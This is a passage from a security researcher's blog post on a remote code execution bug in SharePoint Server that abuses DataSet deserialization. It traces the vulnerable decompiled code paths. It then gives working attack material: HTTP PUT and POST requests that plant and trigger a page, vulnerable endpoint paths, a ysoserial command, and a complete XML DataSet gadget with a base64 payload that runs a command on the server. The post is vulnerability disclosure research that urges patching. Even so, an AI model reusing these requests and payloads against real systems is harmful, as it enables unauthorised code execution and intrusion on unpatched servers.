		<span class="k">this</span><span class="p">.</span><span class="n">compressedDataTable</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span>
		<span class="k">this</span><span class="p">.</span><span class="n">dataTable</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Putting it (almost all) together, I could register a prefix and instantiate the control with a base64 encoded, compressed and serialized, albeit, dangerous <code class="language-plaintext highlighter-rouge">DataTable</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PUT /poc.aspx HTTP/1.1
Host: &lt;target&gt;
Authorization: &lt;ntlm auth header&gt;
Content-Length: 1688

&lt;%@ Register TagPrefix="escape" Namespace="Microsoft.PerformancePoint.Scorecards" Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"%&gt;
&lt;escape:ExcelDataSet runat="server" CompressedDataTable="H4sIAAAAAAAEALVWW2/bNhROegmadtvbHvYm6KFPtmTHSdoqlgs06YZgcRPE2RqgKDKaOrbZSKRGUraMYv9o+43doUTZju2mabHJgESfOw+/80kbmxsbG5/wMk9zfXcPb296U6Uh8Y6IJjXnd5CKCR7ueg3zqzmHWawzCSGHTEsS15yzrB8z+itML8Q18LD/7BnZo3v7zRetXWg8f/HQBP9xIWZxuyD9GO6j5qfZP+8cEqEZH9qU25dJ3KMjSMgTXB2xweAXSZL7m5s/2GDWztS8bUJtPcDb34/aL/Mkdsa2brfpNVwHOBURhg7dTA/qzX33Zef7x+1cBapI4KAHV6Hrlosgx/VI6zTw/clk4k1anpBDf6fRaPqX3ZOyqMo2URHuAANLbqOpesKoFEoMdJ2KJEC7emnlYlbHMXkhhgS4djhJIHRf5+lV3mjsNK6KTpRmpSEGSGPIL6YpWGkpV/BnhruaC9fFTSfcdcrUQdFnjBK6i2fRAzlmFJR3zDVITmIPayE8guitJGkK8o+dd++sw1vGIzFRXpfI6yz1LkkSnwOJQCIGJChMSzS2/Gc8JZgIef0N4Gk1+4PW8719ErX2d6G19762nLyo+rT/Aag2yzMpxuz/LeF9zVnXsf9gNFxHFweC50b41BzO7LQ0kUPQb3AbKiUUDDQTxk8pzSRiExHtz9Hgr8KhkC1DpxBagHwGiEokYPIr0LNSjpXZdw906GqZzUvsEsZnw7uK4crsNwWHmZSY40RQYiyLKHeAOB0JbPTSvhOSV/8y3heZgeq8G3fZd9mvYlI7Ww+RMv553I6QXYYyKB8k+ZbRtj5liC/5VInq46blhIXOV3tZ6qhji2RR0WynEDZnfZZicipxEoouWdMRUYcjwoeA3WJcgdTYrHmPkR5mhMe+zHh1DKEJgmxOk9EdeHKRoSpyeW1R5y8qcZbNWEOEC2QePW0saFFfTv2xLcLBmoNyfuZM5N6IiD5d0CMRmTnqnBGpoO0vSNZYohFqkArVDS3q7YQupMXtB0pLfK24naexPjgHJTJJ4YhRQ0JETqv3iu2RxYM3w4OHePAnjA9y07R9P8eN+OkCkc06/XUxKreSt0KXxrLOKy6x0gOiFCT9eBomigoZs37ldcTIcL2PZ1RcKM2omvurQuc+HeoD04ZVcnbyADkwdE9IxunoMMGBLY3K99HHPCg6a4IH6IPkqv5ynflB4SsL+VDfksFbPr3KtKw76BXHZIQ0iYzcX1Gstfapg5xFnc+7+F9RzBrbmWoVPEbV9i3sbmLVvwWsbf+WOWr7OPMzrlwiGEuWN5mo7S9xY+eB+dZa+gYzX15bV13yQUh8MG4erzIWR9tX5zBmxsR8Xz7C65791vxkryf/AlZRMe+GCgAA" /&gt;
</code></pre></div></div>

<p>However, I couldn’t figure out a way to trigger the <code class="language-plaintext highlighter-rouge">DataTable</code> property getter. I know I needed a way to use the DataSet, but I just didn’t know <em>how</em> too.</p>

<h3 id="many-paths-lead-to-rome">Many Paths Lead to Rome</h3>

<p>The fustration! After going for a walk with my dog, I decided to think about this differently and I asked myself what other sinks are available. Then I remembered that the <code class="language-plaintext highlighter-rouge">DataSet.ReadXml</code> sink was also a source of trouble, so I checked the code again and found this valid code path:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.GetDataSet()
  Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.PopulateDataSetFromCache(DataSet)
</code></pre></div></div>

<p>Inside of the <code class="language-plaintext highlighter-rouge">ContactLinksSuggestionsMicroView</code> class we can see the <code class="language-plaintext highlighter-rouge">GetDataSet</code> method:</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="k">protected</span> <span class="k">override</span> <span class="n">DataSet</span> <span class="nf">GetDataSet</span><span class="p">()</span>
		<span class="p">{</span>
			<span class="k">base</span><span class="p">.</span><span class="nf">StopProcessingRequestIfNotNeeded</span><span class="p">();</span>
			<span class="k">if</span> <span class="p">(!</span><span class="k">this</span><span class="p">.</span><span class="n">Page</span><span class="p">.</span><span class="n">IsPostBack</span> <span class="p">||</span> <span class="k">this</span><span class="p">.</span><span class="n">Hidden</span><span class="p">)</span>                                                                       <span class="c1">// 1</span>
			<span class="p">{</span>
				<span class="k">return</span> <span class="k">null</span><span class="p">;</span>
			<span class="p">}</span>
			<span class="n">DataSet</span> <span class="n">dataSet</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">DataSet</span><span class="p">();</span>
			<span class="n">DataTable</span> <span class="n">dataTable</span> <span class="p">=</span> <span class="n">dataSet</span><span class="p">.</span><span class="n">Tables</span><span class="p">.</span><span class="nf">Add</span><span class="p">();</span>
			<span class="n">dataTable</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"PreferredName"</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="kt">string</span><span class="p">));</span>
			<span class="n">dataTable</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"Weight"</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="kt">double</span><span class="p">));</span>
			<span class="n">dataTable</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"UserID"</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="kt">string</span><span class="p">));</span>
			<span class="n">dataTable</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"Email"</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="kt">string</span><span class="p">));</span>
			<span class="n">dataTable</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"PageURL"</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="kt">string</span><span class="p">));</span>
			<span class="n">dataTable</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"PictureURL"</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="kt">string</span><span class="p">));</span>
			<span class="n">dataTable</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"Title"</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="kt">string</span><span class="p">));</span>
			<span class="n">dataTable</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"Department"</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="kt">string</span><span class="p">));</span>
			<span class="n">dataTable</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"SourceMask"</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
			<span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">IsInitialPostBack</span><span class="p">)</span>                                                                                      <span class="c1">// 2</span>
			<span class="p">{</span>
				<span class="k">this</span><span class="p">.</span><span class="nf">PopulateDataSetFromSuggestions</span><span class="p">(</span><span class="n">dataSet</span><span class="p">);</span>
			<span class="p">}</span>
			<span class="k">else</span>
			<span class="p">{</span>
				<span class="k">this</span><span class="p">.</span><span class="nf">PopulateDataSetFromCache</span><span class="p">(</span><span class="n">dataSet</span><span class="p">);</span>                                                                  <span class="c1">// 3</span>
			<span class="p">}</span>
			<span class="k">this</span><span class="p">.</span><span class="n">m_strJavascript</span><span class="p">.</span><span class="nf">AppendLine</span><span class="p">(</span><span class="s">"var user = new Object();"</span><span class="p">);</span>
			<span class="k">foreach</span> <span class="p">(</span><span class="kt">object</span> <span class="n">obj</span> <span class="k">in</span> <span class="n">dataSet</span><span class="p">.</span><span class="n">Tables</span><span class="p">[</span><span class="m">0</span><span class="p">].</span><span class="n">Rows</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="n">DataRow</span> <span class="n">dataRow</span> <span class="p">=</span> <span class="p">(</span><span class="n">DataRow</span><span class="p">)</span><span class="n">obj</span><span class="p">;</span>
				<span class="kt">string</span> <span class="n">scriptLiteralToEncode</span> <span class="p">=</span> <span class="p">(</span><span class="kt">string</span><span class="p">)</span><span class="n">dataRow</span><span class="p">[</span><span class="s">"UserID"</span><span class="p">];</span>
				<span class="kt">int</span> <span class="n">num</span> <span class="p">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">dataRow</span><span class="p">[</span><span class="s">"SourceMask"</span><span class="p">];</span>
				<span class="k">this</span><span class="p">.</span><span class="n">m_strJavascript</span><span class="p">.</span><span class="nf">Append</span><span class="p">(</span><span class="s">"user['"</span><span class="p">);</span>
				<span class="k">this</span><span class="p">.</span><span class="n">m_strJavascript</span><span class="p">.</span><span class="nf">Append</span><span class="p">(</span><span class="n">SPHttpUtility</span><span class="p">.</span><span class="nf">EcmaScriptStringLiteralEncode</span><span class="p">(</span><span class="n">scriptLiteralToEncode</span><span class="p">));</span>
				<span class="k">this</span><span class="p">.</span><span class="n">m_strJavascript</span><span class="p">.</span><span class="nf">Append</span><span class="p">(</span><span class="s">"'] = "</span><span class="p">);</span>
				<span class="k">this</span><span class="p">.</span><span class="n">m_strJavascript</span><span class="p">.</span><span class="nf">Append</span><span class="p">(</span><span class="n">num</span><span class="p">.</span><span class="nf">ToString</span><span class="p">(</span><span class="n">CultureInfo</span><span class="p">.</span><span class="n">CurrentCulture</span><span class="p">));</span>
				<span class="k">this</span><span class="p">.</span><span class="n">m_strJavascript</span><span class="p">.</span><span class="nf">AppendLine</span><span class="p">(</span><span class="s">";"</span><span class="p">);</span>
			<span class="p">}</span>
			<span class="n">StringWriter</span> <span class="n">stringWriter</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringWriter</span><span class="p">(</span><span class="n">CultureInfo</span><span class="p">.</span><span class="n">CurrentCulture</span><span class="p">);</span>
			<span class="n">dataSet</span><span class="p">.</span><span class="nf">WriteXml</span><span class="p">(</span><span class="n">stringWriter</span><span class="p">);</span>
			<span class="n">SPPageContentManager</span><span class="p">.</span><span class="nf">RegisterHiddenField</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">Page</span><span class="p">,</span> <span class="s">"__SUGGESTIONSCACHE__"</span><span class="p">,</span> <span class="n">stringWriter</span><span class="p">.</span><span class="nf">ToString</span><span class="p">());</span>
			<span class="k">return</span> <span class="n">dataSet</span><span class="p">;</span>
		<span class="p">}</span>
</code></pre></div></div>

<p>At <em>[1]</em> the code checks that the request is a POST back request. To ensure this, an attacker can set the <code class="language-plaintext highlighter-rouge">__viewstate</code> POST variable, then at <em>[2]</em> the code will check that the <code class="language-plaintext highlighter-rouge">__SUGGESTIONSCACHE__</code> POST variable is set, if it’s set, the <code class="language-plaintext highlighter-rouge">IsInitialPostBack</code> getter will return false. As long as this getter returns false, an attacker can land at <em>[3]</em>, reaching <code class="language-plaintext highlighter-rouge">PopulateDataSetFromCache</code>. This call will use a <code class="language-plaintext highlighter-rouge">DataSet</code> that has been created with a specific schema definition.</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="k">protected</span> <span class="k">void</span> <span class="nf">PopulateDataSetFromCache</span><span class="p">(</span><span class="n">DataSet</span> <span class="n">ds</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="kt">string</span> <span class="k">value</span> <span class="p">=</span> <span class="n">SPRequestParameterUtility</span><span class="p">.</span><span class="n">GetValue</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;(</span><span class="k">this</span><span class="p">.</span><span class="n">Page</span><span class="p">.</span><span class="n">Request</span><span class="p">,</span> <span class="s">"__SUGGESTIONSCACHE__"</span><span class="p">,</span> <span class="n">SPRequestParameterSource</span><span class="p">.</span><span class="n">Form</span><span class="p">);</span>
			<span class="k">using</span> <span class="p">(</span><span class="n">XmlTextReader</span> <span class="n">xmlTextReader</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">XmlTextReader</span><span class="p">(</span><span class="k">new</span> <span class="nf">StringReader</span><span class="p">(</span><span class="k">value</span><span class="p">)))</span>
			<span class="p">{</span>
				<span class="n">xmlTextReader</span><span class="p">.</span><span class="n">DtdProcessing</span> <span class="p">=</span> <span class="n">DtdProcessing</span><span class="p">.</span><span class="n">Prohibit</span><span class="p">;</span>
				<span class="n">ds</span><span class="p">.</span><span class="nf">ReadXml</span><span class="p">(</span><span class="n">xmlTextReader</span><span class="p">);</span>                                                                              <span class="c1">// 4</span>
				<span class="n">ds</span><span class="p">.</span><span class="nf">AcceptChanges</span><span class="p">();</span>
			<span class="p">}</span>
		<span class="p">}</span>
</code></pre></div></div>

<p>Inside of <code class="language-plaintext highlighter-rouge">PopulateDataSetFromCache</code>, the code calls <code class="language-plaintext highlighter-rouge">SPRequestParameterUtility.GetValue</code> to get attacker controlled data from the <code class="language-plaintext highlighter-rouge">__SUGGESTIONSCACHE__</code> request variable and parses it directly into <code class="language-plaintext highlighter-rouge">ReadXml</code> using <code class="language-plaintext highlighter-rouge">XmlTextReader</code>. The previously defined schema is overwritten with the attacker supplied schema inside of the supplied XML and deserialization of untrusted types occurs at <em>[4]</em>, leading to <strong>remote code execution</strong>. To trigger this, I created a page that uses the <code class="language-plaintext highlighter-rouge">ContactLinksSuggestionsMicroView</code> type specifically:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PUT /poc.aspx HTTP/1.1
Host: &lt;target&gt;
Authorization: &lt;ntlm auth header&gt;
Content-Length: 252

&lt;%@ Register TagPrefix="escape" Namespace="Microsoft.SharePoint.Portal.WebControls" Assembly="Microsoft.SharePoint.Portal, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"%&gt;
&lt;escape:ContactLinksSuggestionsMicroView runat="server" /&gt;
</code></pre></div></div>

<p>If you are exploiting this bug as a low privlidged user and the <code class="language-plaintext highlighter-rouge">AddAndCustomizePages</code> setting is disabled, then you can possibly exploit the bug with pages that instantiate the <code class="language-plaintext highlighter-rouge">InputFormContactLinksSuggestionsMicroView</code> control, since it extends from <code class="language-plaintext highlighter-rouge">ContactLinksSuggestionsMicroView</code>.</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">namespace</span> <span class="nn">Microsoft.SharePoint.Portal.WebControls</span>
<span class="p">{</span>

	<span class="p">[</span><span class="nf">SharePointPermission</span><span class="p">(</span><span class="n">SecurityAction</span><span class="p">.</span><span class="n">Demand</span><span class="p">,</span> <span class="n">ObjectModel</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
	<span class="p">[</span><span class="nf">AspNetHostingPermission</span><span class="p">(</span><span class="n">SecurityAction</span><span class="p">.</span><span class="n">LinkDemand</span><span class="p">,</span> <span class="n">Level</span> <span class="p">=</span> <span class="n">AspNetHostingPermissionLevel</span><span class="p">.</span><span class="n">Minimal</span><span class="p">)]</span>
	<span class="p">[</span><span class="nf">AspNetHostingPermission</span><span class="p">(</span><span class="n">SecurityAction</span><span class="p">.</span><span class="n">InheritanceDemand</span><span class="p">,</span> <span class="n">Level</span> <span class="p">=</span> <span class="n">AspNetHostingPermissionLevel</span><span class="p">.</span><span class="n">Minimal</span><span class="p">)]</span>
	<span class="p">[</span><span class="nf">SharePointPermission</span><span class="p">(</span><span class="n">SecurityAction</span><span class="p">.</span><span class="n">InheritanceDemand</span><span class="p">,</span> <span class="n">ObjectModel</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
	<span class="k">public</span> <span class="k">class</span> <span class="nc">InputFormContactLinksSuggestionsMicroView</span> <span class="p">:</span> <span class="n">ContactLinksSuggestionsMicroView</span>
	<span class="p">{</span>
</code></pre></div></div>

<p>I found a few endpoints that implement that control <del>(but I haven’t had time to test them)</del> Update: <a href="https://twitter.com/irsdl">Soroush Dalili</a> tested them for me and <a href="https://twitter.com/irsdl/status/1287496351429865473">confirmed</a> that they are indeed, exploitable.</p>

<ol>
  <li>/_layouts/15/quicklinks.aspx?Mode=Suggestion</li>
  <li>/_layouts/15/quicklinksdialogform.aspx?Mode=Suggestion</li>
</ol>

<p>Now, to exploit it we can perform a post request to our freshly crafted page:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /poc.aspx HTTP/1.1
Host: &lt;target&gt;
Authorization: &lt;ntlm auth header&gt;
Content-Type: application/x-www-form-urlencoded
Content-Length: &lt;length&gt;

__viewstate=&amp;__SUGGESTIONSCACHE__=&lt;urlencoded DataSet gadget&gt;
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /quicklinks.aspx?Mode=Suggestion HTTP/1.1
Host: &lt;target&gt;
Authorization: &lt;ntlm auth header&gt;
Content-Type: application/x-www-form-urlencoded
Content-Length: &lt;length&gt;

__viewstate=&amp;__SUGGESTIONSCACHE__=&lt;urlencoded DataSet gadget&gt;
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /quicklinksdialogform.aspx?Mode=Suggestion HTTP/1.1
Host: &lt;target&gt;
Authorization: &lt;ntlm auth header&gt;
Content-Type: application/x-www-form-urlencoded
Content-Length: &lt;length&gt;

__viewstate=&amp;__SUGGESTIONSCACHE__=&lt;urlencoded DataSet gadget&gt;
</code></pre></div></div>

<p>Note that each of these endpoints could also be csrfed, so credentials are not necessarily required.</p>

<h2 id="one-last-thing">One Last Thing</h2>

<p>You cannot use the <code class="language-plaintext highlighter-rouge">XamlReader.Load</code> static method because the IIS webserver is impersonating as the IUSR account and that account has limited access to the registry. If you try, you will end up with a stack trace like this unless you disable impersonation under IIS and use the application pool identity:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{System.InvalidOperationException: There is an error in the XML document. ---&gt; System.TypeInitializationException: The type initializer for 'MS.Utility.EventTrace' threw an exception. ---&gt; System.Security.SecurityException: Requested registry access is not allowed.
   at System.ThrowHelper.ThrowSecurityException(ExceptionResource resource)
   at Microsoft.Win32.RegistryKey.OpenSubKey(String name, Boolean writable)
   at Microsoft.Win32.RegistryKey.OpenSubKey(String name)
   at Microsoft.Win32.Registry.GetValue(String keyName, String valueName, Object defaultValue)
   at MS.Utility.EventTrace.IsClassicETWRegistryEnabled()
   at MS.Utility.EventTrace..cctor()
   --- End of inner exception stack trace ---
   at MS.Utility.EventTrace.EasyTraceEvent(Keyword keywords, Event eventID, Object param1)
   at System.Windows.Markup.XamlReader.Load(XmlReader reader, ParserContext parserContext, XamlParseMode parseMode, Boolean useRestrictiveXamlReader, List`1 safeTypes)
   at System.Windows.Markup.XamlReader.Load(XmlReader reader, ParserContext parserContext, XamlParseMode parseMode, Boolean useRestrictiveXamlReader)
   at System.Windows.Markup.XamlReader.Load(XmlReader reader, ParserContext parserContext, XamlParseMode parseMode)
   at System.Windows.Markup.XamlReader.Load(XmlReader reader)
   at System.Windows.Markup.XamlReader.Parse(String xamlText)
   --- End of inner exception stack trace ---
   at System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader, String encodingStyle, XmlDeserializationEvents events)
   at System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader, String encodingStyle)
   at System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader)
   at System.Data.Common.ObjectStorage.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
   at System.Data.DataColumn.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
   at System.Data.XmlDataLoader.LoadColumn(DataColumn column, Object[] foundColumns)
   at System.Data.XmlDataLoader.LoadTable(DataTable table, Boolean isNested)
   at System.Data.XmlDataLoader.LoadData(XmlReader reader)
   at System.Data.DataSet.ReadXmlDiffgram(XmlReader reader)
   at System.Data.DataSet.ReadXml(XmlReader reader, Boolean denyResolving)
   at System.Data.DataSet.ReadXml(XmlReader reader)
   at Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.PopulateDataSetFromCache(DataSet ds)
   at Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.GetDataSet()
   at Microsoft.SharePoint.Portal.WebControls.PrivacyItemView.GetQueryResults(Object obj)
</code></pre></div></div>

<p>You need to find another dangerous static method or setter to call from a type that doesn’t use interface members, <del>I leave this as an exercise to the reader, good luck!</del></p>

<h2 id="remote-code-execution-exploit">Remote Code Execution Exploit</h2>

<p>Ok so I lied. Look the truth is, I just want people to read the full blog post and not rush to find the exploit payload, it’s better to understand the underlying technology you know? Anyway, to exploit this bug we can (ab)use the <code class="language-plaintext highlighter-rouge">LosFormatter.Deserialize</code> method since the class contains no interface members. To do so, we need to generate a base64 payload of a serialized <code class="language-plaintext highlighter-rouge">ObjectStateFormatter</code> gadget chain:</p>

<p><code class="language-plaintext highlighter-rouge">c:\&gt; ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c mspaint</code></p>

<p>Now, we can plug the payload into the following DataSet gadget and trigger <strong>remote code execution</strong> against the target SharePoint Server!</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;DataSet&gt;</span>
  <span class="nt">&lt;xs:schema</span> <span class="na">xmlns=</span><span class="s">""</span> <span class="na">xmlns:xs=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span> <span class="na">xmlns:msdata=</span><span class="s">"urn:schemas-microsoft-com:xml-msdata"</span> <span class="na">id=</span><span class="s">"somedataset"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"somedataset"</span> <span class="na">msdata:IsDataSet=</span><span class="s">"true"</span> <span class="na">msdata:UseCurrentLocale=</span><span class="s">"true"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;xs:complexType&gt;</span>
        <span class="nt">&lt;xs:choice</span> <span class="na">minOccurs=</span><span class="s">"0"</span> <span class="na">maxOccurs=</span><span class="s">"unbounded"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"Exp_x0020_Table"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;xs:complexType&gt;</span>
              <span class="nt">&lt;xs:sequence&gt;</span>
                <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"pwn"</span> <span class="na">msdata:DataType=</span><span class="s">"System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"</span> <span class="na">type=</span><span class="s">"xs:anyType"</span> <span class="na">minOccurs=</span><span class="s">"0"</span><span class="nt">/&gt;</span>
              <span class="nt">&lt;/xs:sequence&gt;</span>
            <span class="nt">&lt;/xs:complexType&gt;</span>
          <span class="nt">&lt;/xs:element&gt;</span>
        <span class="nt">&lt;/xs:choice&gt;</span>
      <span class="nt">&lt;/xs:complexType&gt;</span>
    <span class="nt">&lt;/xs:element&gt;</span>
  <span class="nt">&lt;/xs:schema&gt;</span>
  <span class="nt">&lt;diffgr:diffgram</span> <span class="na">xmlns:msdata=</span><span class="s">"urn:schemas-microsoft-com:xml-msdata"</span> <span class="na">xmlns:diffgr=</span><span class="s">"urn:schemas-microsoft-com:xml-diffgram-v1"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;somedataset&gt;</span>
      <span class="nt">&lt;Exp_x0020_Table</span> <span class="na">diffgr:id=</span><span class="s">"Exp Table1"</span> <span class="na">msdata:rowOrder=</span><span class="s">"0"</span> <span class="na">diffgr:hasChanges=</span><span class="s">"inserted"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;pwn</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;ExpandedElement/&gt;</span>
        <span class="nt">&lt;ProjectedProperty0&gt;</span>
            <span class="nt">&lt;MethodName&gt;</span>Deserialize<span class="nt">&lt;/MethodName&gt;</span>
            <span class="nt">&lt;MethodParameters&gt;</span>
                <span class="nt">&lt;anyType</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span> <span class="na">xsi:type=</span><span class="s">"xsd:string"</span><span class="nt">&gt;</span>/wEykwcAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC1BTw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBtc3BhaW50IiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=<span class="nt">&lt;/anyType&gt;</span>
            <span class="nt">&lt;/MethodParameters&gt;</span>
            <span class="nt">&lt;ObjectInstance</span> <span class="na">xsi:type=</span><span class="s">"LosFormatter"</span><span class="nt">&gt;&lt;/ObjectInstance&gt;</span>
        <span class="nt">&lt;/ProjectedProperty0&gt;</span>
        <span class="nt">&lt;/pwn&gt;</span>
      <span class="nt">&lt;/Exp_x0020_Table&gt;</span>
    <span class="nt">&lt;/somedataset&gt;</span>
  <span class="nt">&lt;/diffgr:diffgram&gt;</span>
<span class="nt">&lt;/DataSet&gt;</span>
</code></pre></div></div>

<p><img src="./SharePoint and Pwn __ Remote Code Execution Against SharePoint Server Abusing DataSet_files/rce.png" alt="Gaining code execution against the IIS process" title="Gaining code execution against the IIS process"></p>

<h2 id="conclusion">Conclusion</h2>

<p>Microsoft rate this bug with an exploitability index rating of 1 and we agree, meaning you should patch this immediately if you haven’t. It is highly likley that this gadget chain can be used against several applications built with .net so even if you don’t have a SharePoint Server installed, you are still impacted by this bug.</p>

<h2 id="references">References</h2>

<ul>
  <li><a href="https://speakerdeck.com/pwntester/attacking-net-serialization">https://speakerdeck.com/pwntester/attacking-net-serialization</a></li>
  <li><a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/dataset-datatable-dataview/security-guidance">https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/dataset-datatable-dataview/security-guidance</a></li>
  <li><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-874/">https://www.zerodayinitiative.com/advisories/ZDI-20-874/</a></li>
</ul>

  </div>

</article>

      </div>
    </div>
    <footer class="site-footer">
